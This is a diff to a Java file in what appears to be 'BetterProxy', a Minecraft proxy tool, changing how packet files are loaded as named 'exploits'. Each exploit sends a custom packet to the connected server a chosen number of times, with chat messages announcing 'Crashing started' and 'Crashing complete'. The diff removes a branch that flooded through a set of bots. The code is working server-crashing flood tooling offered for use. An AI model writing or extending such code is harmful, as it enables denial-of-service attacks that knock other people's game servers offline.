@@ -68,17 +68,13 @@ public class FileUtil {
                     }
                     Packet p = new CustomPacket(id, data);
 
-                    BetterProxy.getInstance().getExploitManager().addExploit(new Exploit(f.getName().substring(0, f.getName().length() - 5)) {
+                    BetterProxy.getInstance().getExploitManager().addExploit(new Exploit(f.getName().substring(0, f.getName().length() - 5), "[amount]") {
 
                         @Override
-                        public void execute(Player sender, int amount) {
+                        public void execute(Player sender, Object... objects) {
                             ChatUtil.sendChatMessage(sender.getThemeType().getColor(1) + ">> &8Crashing started, method: " + sender.getThemeType().getColor(1) + getName().toUpperCase(), sender, false);
                             final int time = (int) System.currentTimeMillis();
-                            if(sender.getBots().size() > 0) {
-                                sender.getBots().forEach(b -> IntStream.range(0, amount).forEach(i -> b.getSession().sendPacket(p)));
-                            } else {
-                                IntStream.range(0, amount).forEach(i -> sender.getRemoteSession().sendPacket(p));
-                            }
+                            IntStream.range(0, Integer.parseInt((String) objects[0])).forEach(i -> sender.getRemoteSession().sendPacket(p));
                             final int time2 = (int) System.currentTimeMillis() - time;
                             ChatUtil.sendChatMessage(sender.getThemeType().getColor(1) + ">> &8Crashing complete &7(" + sender.getThemeType().getColor(2) + time2 + "ms&7)", sender, false);
                         }
